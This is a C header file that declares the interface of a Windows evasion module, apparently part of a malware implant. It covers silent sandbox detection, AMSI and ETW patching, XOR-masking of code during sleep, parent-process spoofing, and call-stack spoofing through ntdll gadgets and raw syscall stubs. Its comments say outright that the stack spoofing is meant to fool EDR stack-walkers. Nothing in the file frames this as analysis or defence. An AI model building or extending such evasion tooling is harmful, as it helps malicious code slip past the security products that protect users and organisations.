#pragma once
#include <windows.h>

/* Score-based sandbox/analysis detection — exits process silently if detected */
void sandbox_check(void);

/* Call once at startup: patches AMSI/ETW, resolves fn ptrs, finds .text */
void evasion_init(void);

/* XOR-masks .text + PAGE_NOACCESS during sleep, runs from .evasn section */
void sleep_masked(DWORD ms);

/* Spawn cmd with parent_name as spoofed PPID. Returns 1 on success. */
int spawn_with_ppid(const char *cmd, const char *parent_name);

/* Thread worker + shared struct for safe (timeout-aware) PPID dispatch */
typedef struct { char cmd[512]; char parent[128]; int ok; } PpidWork;
DWORD WINAPI ppid_worker(LPVOID arg);

/* ── Phase 10: Call-stack spoofing via ntdll gadget scan ─────────────────
 *
 * 110-byte spoofed stubs plant a call-preceded RET address from ntdll at
 * [RSP] before the syscall instruction so that an EDR stack-walker sees:
 *   ntdll!NtXxx           ← syscall executes here  (syscall;ret gadget)
 *   ntdll+X               ← call-preceded RET       (spoof gadget)   ✓
 */

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NTAPI
#define NTAPI __stdcall
#endif

/* NT syscall function-pointer types */
typedef NTSTATUS (NTAPI *NtAllocVMem_t)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtProtVMem_t)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                              PVOID, PVOID, ULONG,
                                              SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *NtDelayExec_t)(BOOLEAN, PLARGE_INTEGER);

/* Spoofed stub pointers — NULL until init_stack_spoof() succeeds */
extern NtAllocVMem_t      g_NtAllocVM;
extern NtProtVMem_t       g_NtProtVM;
extern NtCreateThreadEx_t g_NtCreateThread;
extern NtDelayExec_t      g_NtDelayExec;

/* Called internally by evasion_init() — do not call directly */
void init_stack_spoof(void);

/* Build a spoofed stub for any raw syscall number on demand.
 * Returns a callable function pointer, or NULL if unavailable. */
void *spoof_syscall_stub(unsigned short ssn);
